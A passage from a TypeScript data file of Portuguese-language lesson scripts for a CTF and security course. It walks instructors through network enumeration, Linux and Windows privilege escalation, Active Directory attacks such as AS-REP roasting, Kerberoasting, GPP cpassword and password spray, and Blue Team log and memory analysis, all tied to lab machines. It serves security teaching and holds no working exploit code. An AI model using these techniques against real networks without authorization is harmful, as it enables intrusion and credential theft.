export interface TeacherNote {
  day: number;
  title: string;
  objective: string;
  blocks: {
    title: string;
    duration: string;
    content: string[];
    questions?: { ask: string; expected: string }[];
  }[];
}

export interface LabSolution {
  labId: string;
  name: string;
  steps: {
    objective: string;
    command?: string;
    explanation: string;
    output?: string;
    errors?: string;
    confirmation: string;
  }[];
  mitre: string[];
}

const teacherScriptBlocksByDay: Record<number, TeacherNote['blocks']> = {
  1: [
    {
      title: 'Script de aula completo: abertura, método e mentalidade',
      duration: '60-75 minutos',
      content: [
        'Fala sugerida: "Hoje eu não quero que vocês decorem comandos. Eu quero que vocês aprendam a fazer perguntas. Um comando só é bom quando responde uma pergunta clara. Se eu rodo Nmap, a pergunta é: quais portas e serviços existem? Se eu rodo curl, a pergunta é: como a aplicação HTTP responde? Se eu abro Wireshark, a pergunta é: que conversa aconteceu na rede? Guardem isso: ferramenta sem pergunta vira barulho."',
        'Explique lentamente a diferença entre descoberta, enumeração, validação e exploração. Diga: "Descobrir é saber que a porta 80 existe. Enumerar é descobrir que ela roda Apache, redireciona para target.htb e tem /admin. Validar é confirmar que /admin realmente exige autenticação ou aceita credenciais fracas. Explorar é agir sobre uma falha validada em ambiente autorizado."',
        'Use o quadro com quatro colunas: Pergunta, Comando, Evidência, Decisão. Preencha um exemplo completo: Pergunta = quais portas existem? Comando = nmap -sC -sV. Evidência = 21 FTP, 22 SSH, 80 HTTP. Decisão = enumerar FTP anonymous, olhar HTTP manualmente e guardar SSH para credenciais reaproveitadas.',
        'Quando ensinar portas, não peça só memorização. Faça associação com comportamento: FTP transfere arquivo e pode vazar senha em texto claro; SSH dá shell remoto; HTTP expõe aplicação; SMB expõe shares e identidade Windows; DNS revela nomes; WinRM pode virar shell PowerShell; RDP é sessão gráfica. O aluno precisa ligar porta a pergunta de investigação.',
        'Antes do primeiro lab, diga explicitamente: "Cap, Nibbles, Jerry, Devel, Blue e Lame não são seis receitas. Eles são seis maneiras de testar se vocês entenderam enumeração. Em todos eles, a pista principal aparece antes da exploração. Se vocês forem direto para exploit sem explicar a pista, eu vou pedir para voltar."',
      ],
      questions: [
        { ask: 'Qual é a diferença entre enumeração e exploração?', expected: 'Enumeração coleta e interpreta evidências; exploração age sobre uma falha já validada em ambiente autorizado.' },
        { ask: 'Por que uma porta aberta ainda não é uma vulnerabilidade?', expected: 'Porque porta aberta só indica superfície. É preciso versão, configuração, permissão ou comportamento inseguro para haver vulnerabilidade.' },
      ]
    },
    {
      title: 'Script de ponte para labs: Cap, Nibbles, Jerry, Devel, Blue e Lame',
      duration: '90 minutos antes dos labs',
      content: [
        'Fala sugerida para Cap: "Nesta máquina, a lição não é FTP apenas. A lição é que tráfego de rede conta histórias. Se uma aplicação entrega PCAPs e você consegue acessar capturas diferentes mudando um número, isso é falha de controle de acesso. Dentro do PCAP, protocolos sem criptografia podem revelar credenciais. Depois, no Linux, capability é uma permissão granular: se Python pode chamar setuid, ele pode assumir UID 0. Então Cap junta IDOR simples, PCAP, FTP claro, reaproveitamento de senha e capability."',
        'Fala sugerida para Nibbles: "Aqui eu quero que vocês leiam antes de atacar. Código-fonte HTML, comentários, diretórios previsíveis e painel admin são parte da enumeração. Depois, upload inseguro ensina validação de arquivo: extensão, content type e local onde o arquivo é salvo. Por fim, sudo -l mostra uma regra NOPASSWD. A máquina ensina que web e Linux local são uma cadeia só."',
        'Fala sugerida para Jerry: "Tomcat Manager existe para administrar aplicações Java. Se ele fica exposto com credenciais padrão, o atacante não precisa de uma vulnerabilidade complexa: ele usa funcionalidade administrativa legítima para fazer deploy de um WAR. O conceito importante é abuso de função administrativa exposta."',
        'Fala sugerida para Devel: "Pensem no caminho do arquivo. Se FTP permite escrita e o diretório é a raiz servida pelo IIS, upload vira publicação web. Se o IIS executa ASPX, arquivo enviado pode virar execução. Não é magia: é a combinação de permissão de escrita com interpretador web."',
        'Fala sugerida para Blue e Lame: "Essas duas ensinam cuidado com CVE. Versão vulnerável orienta pesquisa, mas o aluno deve confirmar protocolo, versão e contexto. Em Blue, SMBv1/MS17-010 é clássico. Em Lame, Samba antigo tem comportamento vulnerável. O objetivo didático é entender por que versão importa e por que patch level muda tudo."',
        'Atividade antes dos labs: peça para cada aluno preencher uma linha para cada máquina com: vetor provável, serviço envolvido, ferramenta de enumeração, evidência que confirmaria a hipótese e risco defensivo correspondente.',
      ],
      questions: [
        { ask: 'Qual conceito conecta FTP anonymous em Devel com execução web?', expected: 'A pasta gravável via FTP também é servida pelo IIS; se o servidor executa ASPX, upload pode virar execução.' },
        { ask: 'Por que Jerry não precisa começar com exploit público?', expected: 'Porque o Tomcat Manager exposto com credenciais padrão já oferece função legítima de deploy que pode ser abusada no lab.' },
      ]
    }
  ],
  2: [
    {
      title: 'Script de aula completo: identidade, logs e AD',
      duration: '75-90 minutos',
      content: [
        'Fala sugerida: "Ontem vocês olharam para portas. Hoje vocês vão olhar para identidades. Em Active Directory, a pergunta principal é: quem é esse usuário, a que grupos pertence, que permissões tem e que caminho isso cria até um objetivo? Um usuário fraco pode não ser admin, mas pode ter uma relação que leva a admin."',
        'Explique Kerberos desenhando no quadro. Diga: "O usuário pede um TGT ao KDC. Com o TGT, pede um TGS para acessar um serviço. AS-REP Roasting acontece antes da pré-autenticação quando a conta permite isso. Kerberoasting acontece quando pedimos ticket para serviço com SPN. Em ambos, o que quebramos offline é consequência de senha fraca."',
        'Faça a ponte Blue Team: "O mesmo ataque que o Red Team executa deixa rastro. AS-REP e Kerberoast podem aparecer como eventos Kerberos; logons aparecem como 4624; falhas como 4625; privilégio admin como 4672; processo criado como 4688 ou Sysmon 1; conexão como Sysmon 3. A função do analista é montar timeline, não colecionar IDs soltos."',
        'Quando falar de Wazuh, enfatize que alerta não é conclusão. Fala sugerida: "Wazuh me diz que algo merece atenção. O relatório final precisa dizer o que aconteceu, com qual usuário, em qual host, em qual horário, com qual evidência. Se eu não consigo apontar para o log bruto, eu ainda não tenho conclusão."',
        'Antes dos labs, apresente a tabela técnica -> pré-requisito -> evidência: AS-REP precisa usuário sem pré-auth; Kerberoasting precisa conta com SPN e credencial válida; GPP precisa Groups.xml com cpassword; DCSync precisa permissão de replicação; password spray precisa política de lockout conhecida.',
      ],
      questions: [
        { ask: 'Por que Kerberoasting não é simplesmente "quebrar o Kerberos"?', expected: 'Porque o protocolo funciona como desenhado; o ataque explora ticket criptografado com senha fraca da conta de serviço.' },
        { ask: 'Por que Wazuh não substitui análise manual?', expected: 'Porque ele gera alerta e correlação inicial, mas a conclusão exige contexto, log bruto e validação.' },
      ]
    },
    {
      title: 'Script de ponte para labs medium',
      duration: '90 minutos antes dos labs',
      content: [
        'Forest: explique que o ponto de partida é identidade exposta. Fala sugerida: "Se RPC permite listar usuários sem autenticação, o domínio acabou de entregar um dicionário de contas. AS-REP testa uma configuração fraca nessas contas. BloodHound depois mostra relações; ele não explora por vocês, ele desenha o mapa."',
        'Sauna: diga que OSINT interno também existe em CTF. Nomes no site podem virar usernames. A aula deve mostrar padrões como nome.sobrenome, inicialsobrenome e sobrenome.nome. Depois conecte com AS-REP e com AutoLogon no Registry.',
        'Active: faça uma mini-aula de SYSVOL/GPP. "Políticas de grupo eram usadas para distribuir configurações. O problema histórico é que cpassword em Groups.xml podia ser decifrado porque a chave AES foi publicada. Então o achado não é só arquivo XML: é credencial administrativa legada em política."',
        'Monteverde: explique password spray com responsabilidade. "Brute force tenta muitas senhas em uma conta. Spray tenta uma senha provável em muitas contas para reduzir lockout. Em ambiente real isso pode bloquear contas e é proibido sem autorização. No lab, serve para ensinar política de senha e risco de senha igual ao username."',
        'Cascade: explique LDAP attributes e recycle bin. "Nem tudo que importa está nos atributos padrão. Campos customizados, descrição, info e objetos deletados podem revelar dados legados. Forense de diretório também é forense."',
        'Cronos: mostre que nem todo lab medium é AD. "DNS zone transfer revela superfície escondida; SQLi bypassa autenticação; cron job gravável vira root. É a mesma metodologia do Dia 1, mas com encadeamento maior."',
      ],
      questions: [
        { ask: 'Qual pré-requisito separa AS-REP de Kerberoasting?', expected: 'AS-REP precisa conta sem pré-autenticação; Kerberoasting precisa credencial válida para solicitar tickets de contas com SPN.' },
        { ask: 'Por que password spray exige conhecer lockout policy?', expected: 'Porque tentativas erradas podem bloquear contas; a política define risco e limite operacional.' },
      ]
    }
  ],
  3: [
    {
      title: 'Script de aula completo: cadeias hard, memória e privilégio',
      duration: '90 minutos',
      content: [
        'Fala sugerida: "Hoje vocês vão sentir que as máquinas ficaram injustas. Elas não ficaram. Elas só pararam de entregar um caminho único. Em hard, o trabalho é preservar contexto. Cada credencial, cada grupo, cada arquivo e cada log pode ser uma peça. Se vocês não escreverem a cadeia, vão esquecer por que chegaram onde chegaram."',
        'Explique Volatility como investigação, não como lista de plugins. "pslist responde quem estava ativo. pstree responde quem criou quem. cmdline responde com quais argumentos. netscan responde quem falava na rede. malfind responde se há memória com características suspeitas. Nenhum plugin sozinho condena um processo; a combinação cria evidência."',
        'Ao falar de malware, mantenha postura defensiva. "Nós não estamos criando malware. Estamos aprendendo a olhar para uma amostra e extrair IOCs: hash, strings, URLs, comandos, imports, packer e hipótese de comportamento. O objetivo é escrever: esta amostra provavelmente tenta persistir aqui, conectar ali, executar tal comando."',
        'Para privesc, faça a turma repetir a árvore: identidade, permissões, serviços, arquivos, credenciais, patch. Diga: "Achado não é vetor até existir condição de exploração. Serviço com path não aspado só importa se o Windows procurar um caminho onde você escreve. SeBackupPrivilege só importa se você souber usá-lo para ler arquivos protegidos."',
        'Em AD avançado, ensine pré-requisitos. "ForceChangePassword não aparece do nada; é uma aresta. DCSync exige permissão de replicação. ADCS exige template vulnerável. MSSQL exige credencial e permissão. Responder exige fluxo de autenticação capturável. A pergunta é sempre: qual permissão me autoriza a tentar isso no lab?"',
      ],
      questions: [
        { ask: 'Por que malfind sozinho não prova malware?', expected: 'Porque pode gerar falso positivo; é preciso correlacionar com processo, cmdline, rede, DLLs e contexto.' },
        { ask: 'O que diferencia achado interessante de vetor explorável?', expected: 'Vetor explorável tem pré-requisito validado, permissão necessária e caminho de execução confirmado.' },
      ]
    },
    {
      title: 'Script de ponte para labs hard e insane',
      duration: '90 minutos antes dos labs',
      content: [
        'Blackfield: apresente como cadeia-modelo. "SMB profiles revela usernames. AS-REP dá uma conta. BloodHound mostra ForceChangePassword. A nova conta acessa evidência forense. LSASS dump revela hash. SeBackupPrivilege permite extrair NTDS. NTDS revela hashes do domínio. Essa máquina é uma aula de cadeia e documentação."',
        'Sizzle: explique SCF com cuidado. "O conceito é coerção de autenticação: um arquivo em share pode fazer o Windows tentar buscar recurso remoto e autenticar. Em lab, isso ensina NetNTLMv2 e risco de shares graváveis. Depois entram ADCS e relações de domínio."',
        'Querier: explique que documentos podem conter segredos técnicos. "Uma planilha com string de conexão pode dar acesso ao MSSQL. MSSQL pode ter xp_cmdshell. O serviço pode tentar autenticar em recurso remoto e vazar NetNTLM. Isso conecta arquivo, banco, rede e identidade."',
        'Mantis: explique aplicação .NET e configuração. "Aplicações precisam guardar segredo em algum lugar: config, banco, registry, variável. O aluno deve procurar onde a aplicação obtém credenciais e como isso conecta ao domínio."',
        'Reel2: trate phishing como conceito controlado de laboratório. "Não estamos ensinando campanha real. Estamos estudando por que clientes e documentos podem disparar autenticação e por que controles como JEA limitam PowerShell. O foco é entender risco e evidência."',
        'Multimaster: posicione como aspiracional. "SQLi com WAF exige entender transformação de input. Sysmon ajuda a enxergar execução. Túneis e Exchange abuse mostram que ambientes reais têm muitas camadas. O objetivo é aprender a não se desesperar quando a cadeia é longa."',
      ],
      questions: [
        { ask: 'Por que Blackfield é uma máquina de cadeia e não de uma vulnerabilidade só?', expected: 'Porque exige vários saltos: enumeração, roasting, ACL, credencial forense, privilégio de backup e dump offline.' },
        { ask: 'Qual cuidado didático ao falar de phishing/Responder?', expected: 'Manter estritamente em laboratório autorizado e explicar como risco defensivo e evidência, não como campanha real.' },
      ]
    }
  ],
  4: [
    {
      title: 'Script de aula completo: revisão ativa e relatório',
      duration: '90 minutos',
      content: [
        'Fala sugerida: "Hoje eu não vou perguntar se vocês lembram a flag. Eu vou perguntar se vocês sabem explicar a cadeia. Uma pessoa que só lembra a flag não consegue repetir em outro ambiente. Uma pessoa que entende pergunta, evidência e decisão consegue resolver máquinas novas."',
        'Conduza revisão por recuperação ativa. Diga um comando e peça três respostas: quando usar, o que espero ver, qual erro comum. Exemplo: GetNPUsers.py. Quando usar? Depois de obter lista de usuários em AD. O que espero? Hash AS-REP para contas sem pré-auth. Erro comum? Rodar sem domínio/DNS correto ou usar modo hashcat errado.',
        'No relatório, ensine precisão. "Não escrevam: encontrei uma senha. Escrevam: o arquivo Groups.xml no share Replication continha campo cpassword; a senha foi recuperada com gpp-decrypt; a credencial autenticou via SMB como SVC_TGS." Essa diferença separa relato informal de relatório técnico.',
        'No simulado, use timeboxing. "Se em 20 minutos uma hipótese não gerou evidência, vocês não falharam; vocês aprenderam que aquela pergunta talvez esteja errada. Escrevam o que foi tentado, o que foi observado e escolham próxima pergunta."',
        'Feche com plano individual. Cada aluno deve escolher três lacunas: uma de rede/web, uma de AD/Windows e uma de forense/privesc. Para cada lacuna, escolher comando para treinar, lab para refazer e evidência que provará melhora.',
      ],
      questions: [
        { ask: 'O que uma boa timeline precisa ter?', expected: 'Timestamp, evento, fonte da evidência, usuário/host envolvido e interpretação curta.' },
        { ask: 'Por que speed run sem documentação treina o hábito errado?', expected: 'Porque reforça tentativa sem evidência; em prova e trabalho real, resultado precisa ser explicado e reproduzido.' },
      ]
    }
  ]
};

const teacherTenHourBlocksByDay: Record<number, TeacherNote['blocks']> = {
  1: [
    {
      title: 'Roteiro cronometrado garantido (10h30): Dia 1',
      duration: '10h30 com teoria, prática, correção e labs',
      content: [
        '0:00-0:20 — Abertura. Fala sugerida: "Hoje vocês vão aprender a pensar como operadores cuidadosos. O objetivo não é decorar Nmap, curl ou ffuf. O objetivo é saber qual pergunta cada ferramenta responde e qual decisão a saída permite." Peça para todos criarem pasta do caso e arquivo de notas.',
        '0:20-1:15 — Fundamentos de rede. Explique TCP, UDP, portas, estados do Nmap e relação entre serviço e protocolo. Faça perguntas orais a cada porta: "Se vejo 445, que perguntas faço? Se vejo 21, que risco aparece? Se vejo 80, por que curl vem antes de fuzzing?"',
        '1:15-2:30 — Nmap guiado. Rode scan inicial ao vivo, marque cada coluna da saída e peça aos alunos para escreverem três hipóteses. Depois rode all ports e targeted scan. Mostre por que salvar output é evidência.',
        '2:30-3:45 — Web manual. Fala sugerida: "Antes de atacar uma aplicação, conversem com ela." Demonstre curl -i, -I, -L, cookies, Host header, robots.txt, código-fonte e comentários HTML. Só depois mostre ffuf/gobuster.',
        '3:45-4:30 — Fuzzing com filtros. Mostre uma execução ruim cheia de falso positivo e uma execução boa com -fc ou -fs. Peça para cada aluno explicar por que filtrou daquele jeito.',
        '4:30-5:30 — FTP, SMB e SSH. Demonstre anonymous FTP, smbclient -L -N, conexão a share e SSH com senha/chave. Conecte com Cap, Devel e Active mesmo que Active seja Dia 2.',
        '5:30-6:45 — Linux local. Faça drill com whoami, id, sudo -l, SUID, capabilities, cron e grep por segredos. Depois rode linPEAS como comparação: cada achado destacado precisa ser validado com comando nativo. Fala sugerida: "Foothold não é final; é o começo da investigação local; linPEAS ajuda a cobrir, mas não pensa por vocês."',
        '6:45-7:30 — Wireshark/PCAP. Abra PCAP com FTP, mostre Follow TCP Stream e credenciais em texto claro. Peça mini-relatório de 10 linhas.',
        '7:30-10:00 — Labs easy com checkpoints. A cada 30 minutos, pare a turma e pergunte: qual serviço, qual evidência, qual hipótese, qual próximo comando? Não entregue solução completa antes do debrief.',
        '10:00-10:30 — Debrief. Cada aluno apresenta um erro de método e uma evidência boa. Feche ligando cada lab ao conteúdo ensinado.',
      ]
    }
  ],
  2: [
    {
      title: 'Roteiro cronometrado garantido (10h30): Dia 2',
      duration: '10h30 com investigação, AD, forense e labs',
      content: [
        '0:00-0:25 — Recap ativo. Peça para a turma explicar Nmap, HTTP, SMB e PCAP sem olhar. Corrija lacunas antes de AD.',
        '0:25-1:30 — Wazuh e triagem. Fala sugerida: "Alerta não é conclusão." Mostre rule level, decoder, raw log, srcip, usuário e agente. Peça ficha de triagem.',
        '1:30-2:45 — Windows Event IDs. Explique 4624, 4625, 4672, 4688 e tipos de logon. Monte timeline simulada com a turma.',
        '2:45-3:30 — Sysmon. Mostre Event 1, 3, 11, 13, 22. Faça cadeia processo -> rede -> arquivo.',
        '3:30-4:45 — Kerberos. Desenhe AS-REQ, TGT, TGS, KDC, SPN. Posicione AS-REP e Kerberoast no desenho. Repita até a turma explicar sozinha.',
        '4:45-5:45 — Ferramentas AD. Demonstre rpcclient, GetNPUsers, GetUserSPNs, hashcat e BloodHound em dados de exemplo. Foque pré-requisito e saída.',
        '5:45-6:45 — GPP, SYSVOL e shares. Explique Groups.xml, cpassword e por que políticas antigas expõem senha.',
        '6:45-7:30 — Forense de disco e PCAP. Conecte artefatos a perguntas: execução, login, arquivo, persistência, credencial.',
        '7:30-10:00 — Labs medium com checkpoints. Cada checkpoint deve ter técnica, pré-requisito, evidência e próximo passo.',
        '10:00-10:30 — Debrief. Peça para cada aluno explicar uma técnica AD e sua mitigação.',
      ]
    }
  ],
  3: [
    {
      title: 'Roteiro cronometrado garantido (10h30): Dia 3',
      duration: '10h30 com memória, malware, privesc, AD avançado e labs',
      content: [
        '0:00-0:30 — Abertura. Fala sugerida: "Hoje o conteúdo fica longo porque as cadeias ficam longas. Vocês serão avaliados pela capacidade de preservar contexto."',
        '0:30-1:45 — Volatility triagem. Rode info, pslist, psscan, pstree e cmdline. Peça tabela PID/PPID/cmdline/suspeita.',
        '1:45-2:45 — Rede e injeção. Use netscan, dlllist e malfind. Ensine que nenhum plugin isolado prova comprometimento.',
        '2:45-4:00 — Malware estático. Calcule hash, rode file, strings, xxd, readelf/objdump/binwalk/upx. Peça IOC list.',
        '4:00-5:00 — MITRE por evidência. Mostre evidências e peça técnica com justificativa. Corte chutes pelo nome.',
        '5:00-6:15 — Privesc Linux. Faça árvore: identidade, sudo, SUID, capabilities, cron, segredos.',
        '6:15-7:15 — Privesc Windows. Faça árvore: token, grupos, serviços, registry, credenciais, patches.',
        '7:15-8:00 — AD avançado. Explique ForceChangePassword, SeBackupPrivilege, DCSync, ADCS, MSSQL e coerção NTLM por pré-requisito.',
        '8:00-10:10 — Labs hard. Use timeboxing de 20 minutos por hipótese. Exija cadeia escrita.',
        '10:10-10:30 — Debrief. Cada aluno apresenta uma cadeia com pelo menos cinco evidências.',
      ]
    }
  ],
  4: [
    {
      title: 'Roteiro cronometrado garantido (10h30): Dia 4',
      duration: '10h30 com avaliação, relatório e simulado',
      content: [
        '0:00-1:00 — Prova oral de comandos. Sorteie comandos e peça: quando usar, por que usar, saída esperada, cuidado e próximo passo.',
        '1:00-2:00 — Revisão por mapa. A turma monta mapa completo: redes, web, Linux, Windows, AD, forense, malware, MITRE, relatório.',
        '2:00-3:30 — Simulado Blue Team. Dê logs/PCAP e cobre timeline com conclusão e evidência.',
        '3:30-5:00 — Simulado Red Team. Dê alvo de lab e cobre enumeração com hipótese. Não precisa root; precisa método.',
        '5:00-6:15 — Relatório. Transforme uma cadeia em finding técnico: descrição, evidência, impacto, MITRE, recomendação.',
        '6:15-8:45 — Speed runs. Refaça labs conhecidos com timer, checkpoints e documentação obrigatória.',
        '8:45-9:45 — Correção coletiva. Classifique erros: conhecimento, método, atenção, ferramenta, documentação.',
        '9:45-10:30 — Plano de reforço. Cada aluno define lacunas, comandos para treinar, labs para refazer e prazo.',
      ]
    }
  ]
};

const baseTeacherNotes: TeacherNote[] = [
  {
    day: 1,
    title: 'Dia 1 — Fundamentos e Prática Fácil',
    objective: 'Ao final do dia, alunos devem compreender fundamentos de redes, operar Linux com confiança e executar o primeiro scan Nmap de forma autônoma.',
    blocks: [
      {
        title: 'Roteiro obrigatório (10h30): Como conduzir o dia',
        duration: '10h30 de estudo líquido',
        content: [
          'Abra o dia deixando claro que cada comando deve responder uma pergunta. Faça os alunos escreverem hipótese -> comando -> resultado -> decisão desde o primeiro scan.',
          'Divida o quadro em quatro colunas fixas: Serviço, Evidência, Hipótese, Próximo passo. Atualize ao vivo conforme a turma encontra portas, headers, shares e arquivos.',
          'Em cada demonstração, primeiro pergunte o que a ferramenta deve descobrir. Só depois rode o comando. Isso força raciocínio antes da memorização.',
          'A cada 90 minutos, faça uma checagem curta: cada aluno explica um comando e um erro comum. Se alguém só souber copiar, volte um passo.',
          'No bloco de labs, não aceite flag sem write-up mínimo. O aluno precisa registrar caminho, evidência, comando e motivo de cada etapa.',
          'Fechamento obrigatório: cada aluno entrega uma tabela com 10 comandos do dia, quando usar, saída esperada e próximo passo.',
        ],
        questions: [
          { ask: 'Qual pergunta o Nmap responde que o curl não responde?', expected: 'Nmap descobre portas, estados, serviços e versões; curl investiga uma aplicação/protocolo HTTP específico.' },
          { ask: 'Quando um 403 em fuzzing é interessante?', expected: 'Quando indica que o recurso existe, mas o acesso foi negado; pode exigir autenticação, vhost, bypass de path ou análise manual.' },
          { ask: 'Por que salvar scan.txt é parte da técnica, não burocracia?', expected: 'Porque o output vira evidência, evita retrabalho e permite comparar hipóteses depois.' },
        ]
      },
      {
        title: 'Bloco Matutino (3h): Redes + Linux',
        duration: '3 horas',
        content: [
          'Comece com a pergunta de abertura: "Por que TCP importa em CTF?" — engage a turma antes de qualquer conteúdo.',
          'Explique TCP/IP com analogia: TCP é como carta registrada (confirmação), UDP é como panfleto (sem garantia).',
          'Mostre scan Nmap AO VIVO em máquina do lab. Explique cada linha do output junto com a turma.',
          'Cobre portas comuns como flashcard: diga a porta, alunos respondem o serviço.',
          'Demonstre curl -I e curl -v para headers HTTP. Mostre a diferença prática.',
          'Pausa de 15 minutos após 90 minutos.',
          'Permissões Linux: mostre ls -la, explique os três grupos (dono/grupo/outros), converta para numérico ao vivo.',
          'Demo SUID: find / -perm -4000 2>/dev/null em uma máquina limpa. Mostre que python3 com SUID pode virar root.',
        ],
        questions: [
          { ask: 'Qual a diferença entre TCP e UDP?', expected: 'TCP orientado à conexão com confirmação (3-way handshake), UDP sem conexão, mais rápido mas sem garantia.' },
          { ask: 'O que faz o -sV no Nmap?', expected: 'Tenta identificar a versão do serviço em cada porta aberta.' },
          { ask: 'O que significa SUID em um binário?', expected: 'Executa com as permissões do dono do arquivo, não do usuário que chamou.' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): Web + Windows',
        duration: '3 horas',
        content: [
          'Demo ao vivo: gobuster enumerando diretórios em uma aplicação de teste.',
          'Mostre SQLi básico com curl e navegador: altere parâmetro, compare status/tamanho da resposta e explique por que a validação vem antes de qualquer automação.',
          'Windows Event Viewer: abra em VM Windows, filtre por 4625. Mostre como ler um logon falho.',
          'Explique Event IDs como cartões de identidade de eventos. Faça a turma montar uma tabela de memória.',
          'Wireshark: abra PCAP com credenciais FTP, filtre "ftp", mostre USER e PASS em texto claro.',
        ],
        questions: [
          { ask: 'Qual status HTTP indica recurso movido permanentemente?', expected: '301 Moved Permanently.' },
          { ask: 'Qual Event ID indica brute force em andamento?', expected: '4625 em sequência rápida de uma mesma origem.' },
          { ask: 'Como filtrar só traffic FTP no Wireshark?', expected: 'Usar filtro "ftp" no campo de filtros.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs',
        duration: '6 horas',
        content: [
          'Cap: não entregue o caminho. Pergunte "O que você nota de diferente na URL?" para guiar sem spoilar.',
          'Após encontrarem o PCAP, pergunte: "Que protocolo usa texto claro aqui?" antes de revelar FTP.',
          'Nibbles: se travarem após 15 min sem encontrar /nibbleblog, dê a dica diretamente. Tempo é recurso.',
          'Jerry: explique o conceito de WAR deployment antes de deixar tentar. O conceito é mais importante que a execução.',
          'Para labs cronometrados: defina timer visível para a turma. Aplique disciplina de prova real.',
          'Debrief após cada lab: o que funcionou, o que desperdiçou tempo.',
        ],
        questions: [
          { ask: 'Na Cap, como o Python pode virar root sem SUID?', expected: 'Capabilities: cap_setuid+ep permite que python3 chame setuid(0) e mude para root.' },
          { ask: 'Na Nibbles, como você determinou o caminho do painel admin?', expected: 'Comentário no código-fonte HTML da página inicial apontando para /nibbleblog.' },
        ]
      }
    ]
  },
  {
    day: 2,
    title: 'Dia 2 — Blue Team e Conteúdo Intermediário',
    objective: 'Alunos devem ser capazes de investigar alertas Wazuh, compreender fluxo de ataque AD básico e analisar PCAP em nível intermediário.',
    blocks: [
      {
        title: 'Roteiro obrigatório (10h30): Evidência e identidade',
        duration: '10h30 de estudo líquido',
        content: [
          'Comece o dia revisando a diferença entre alerta, log bruto, evidência e conclusão. O aluno deve aprender a não confiar apenas no título do alerta.',
          'Use um mesmo incidente fictício ao longo do dia: brute force, login bem-sucedido, execução de PowerShell, conexão externa e persistência. Vá enriquecendo a timeline a cada bloco.',
          'No módulo AD, desenhe Kerberos com setas e portas. Depois peça para a turma mapear onde AS-REP Roasting e Kerberoasting entram no desenho.',
          'Antes dos labs, cada aluno deve montar uma tabela: técnica AD, pré-requisito, ferramenta, hash gerado, modo hashcat e evidência de sucesso.',
          'Durante os labs, exija validação: credencial encontrada precisa ter origem documentada e teste controlado. Nada de senha solta sem contexto.',
          'Fechamento obrigatório: uma timeline com pelo menos 8 eventos correlacionando Wazuh, Windows Event IDs, Sysmon ou PCAP.',
        ],
        questions: [
          { ask: 'Qual a diferença entre 4624 e 4672?', expected: '4624 indica logon bem-sucedido; 4672 indica que privilégios especiais foram atribuídos, comum em logon administrativo.' },
          { ask: 'Por que AS-REP Roasting pode funcionar sem senha?', expected: 'Porque contas sem pré-autenticação Kerberos permitem solicitar material criptográfico offline sem credencial prévia.' },
          { ask: 'O que BloodHound mostra: exploit ou relação?', expected: 'Relações e permissões no AD. O operador ainda precisa validar cada aresta antes de agir.' },
        ]
      },
      {
        title: 'Bloco Matutino (3h): Wazuh + Logs',
        duration: '3 horas',
        content: [
          'Abra dashboard Wazuh (ambiente demo) — mostre a lista de alertas ao vivo.',
          'Clique em um alerta de nível 10+ e leia junto com a turma: rule ID, descrição, agente, srcip, user.',
          'Mostre como filtrar alertas pelo mesmo srcip para identificar padrão de ataque.',
          'Windows Event Viewer demo: filtre 4625 e mostre como identificar brute force por timestamp e IP.',
          'Exercício: dê à turma um arquivo CSV de alertas exportado e peça para identificar o atacante.',
        ],
        questions: [
          { ask: 'Qual nível de alerta Wazuh você investigaria primeiro?', expected: 'Level 10 ou maior — indica severidade alta ou crítica.' },
          { ask: 'Alguém faz login às 3h da manhã com conta Admin de IP externo. Qual Event ID e o que verificar?', expected: '4624 para o logon + 4672 se foram atribuídos privilégios especiais. Verificar srcip, tipo de logon (Network=3, Interactive=2).' },
        ]
      },
      {
        title: 'Bloco Vespertino (3h): AD + Forense de Disco',
        duration: '3 horas',
        content: [
          'Desenhe o fluxo Kerberos no quadro: usuário → AS_REQ → TGT → TGS → serviço.',
          'Explique AS-REP Roasting: "E se o usuário não precisa de senha para pedir TGT?"',
          'Mostre BloodHound graficamente: como ler caminhos de ataque, o que significa "CanDCSync".',
          'Forense de disco: abra Autopsy com imagem demo, mostre timeline view.',
          'Prefetch demo: procure notepad.exe, mostre que mesmo deletado o Prefetch prova execução.',
        ],
        questions: [
          { ask: 'Por que AS-REP Roasting funciona sem credenciais?', expected: 'Contas com "não requer pré-autenticação Kerberos" ativado permitem qualquer um solicitar TGT. O hash do TGT pode ser quebrado offline.' },
          { ask: 'Qual artefato Windows prova que um programa foi executado mesmo após ser deletado?', expected: 'Prefetch: C:\\Windows\\Prefetch\\ — contém nome do executável e timestamps de última execução.' },
        ]
      },
      {
        title: 'Bloco Noturno (6h): Labs Medium',
        duration: '6 horas',
        content: [
          'Active: deixe alunos descobrirem o GPP por conta própria. Se travarem por 20min, mostre o comando smbclient mas não o arquivo.',
          'Forest: explique RPC enumeration antes de iniciar. É o primeiro passo não-óbvio.',
          'BloodHound: mostre como instalar e importar o JSON coletado antes dos labs.',
          'Para labs cronometrados: sem dicas após iniciar o timer.',
        ],
        questions: [
          { ask: 'O que é cpassword em Groups.xml?', expected: 'Senha criptografada com AES em políticas GPP. A Microsoft publicou a chave publicamente. A ferramenta gpp-decrypt decodifica qualquer cpassword.' },
        ]
      }
    ]
  },
  {
    day: 3,
    title: 'Dia 3 — Forense Avançada e Labs Difíceis',
    objective: 'Alunos executam análise de memória, identificam indicadores de malware e encadeiam técnicas avançadas de AD em labs difíceis.',
    blocks: [
      {
        title: 'Roteiro obrigatório (10h30): Cadeias avançadas com prova',
        duration: '10h30 de estudo líquido',
        content: [
          'Explique que o Dia 3 exige encadeamento: nenhum achado isolado basta. Processo suspeito precisa de cmdline, conexão, artefato ou mapeamento MITRE.',
          'Na análise de memória, faça a turma preencher uma tabela PID -> PPID -> comando -> conexão -> suspeita. Isso impede conclusões baseadas só em nome de processo.',
          'Na análise de malware, mantenha o foco defensivo: hash, strings, imports, IOCs e comportamento provável. Não execute amostras fora de sandbox de laboratório.',
          'Em privesc, use uma árvore de decisão fixa: identidade, sudo/token, serviços, arquivos graváveis, credenciais, kernel/patch. O aluno deve saber por que cada etapa existe.',
          'Nos labs hard, aplique timeboxing. Se uma hipótese não gerou evidência em 20 minutos, o aluno escreve o que sabe e escolhe uma nova pergunta.',
          'Fechamento obrigatório: cada aluno apresenta uma cadeia completa com pelo menos 5 evidências e 2 técnicas MITRE.',
        ],
        questions: [
          { ask: 'Por que pstree é mais útil que pslist em muitos casos?', expected: 'Porque mostra relação pai-filho, permitindo identificar cadeias anômalas como Word gerando cmd ou serviço web gerando shell.' },
